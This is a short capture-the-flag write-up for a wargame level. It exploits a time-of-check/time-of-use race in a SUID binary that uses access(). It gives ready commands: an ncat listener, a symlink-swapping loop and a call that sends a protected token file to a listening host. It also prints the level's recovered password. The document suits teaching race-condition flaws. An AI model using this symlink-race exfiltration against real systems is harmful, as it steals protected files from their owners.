`./level10` takes two arguments `file` and `host`

It checks if the user can read `file` using access(), then sends its content to `host` if listenning on port 6969

access() doesn't care about SUID bit

start a `ncat` listener on port 6969

```
ncat -klnp 6969
```

```
touch /tmp/a
while :; do ln -fs /tmp/a /tmp/b ; ln -fs /home/user/level10/token /tmp/b; done &
./level10 /tmp/b 10.0.0.4
```

You might need to run the last comman multiple times before receiving the token on the listener

flag10's password: woupa2yuojeeaaed06riuj63c

To get the flag run the following

```
su flag10 -c getflag
```
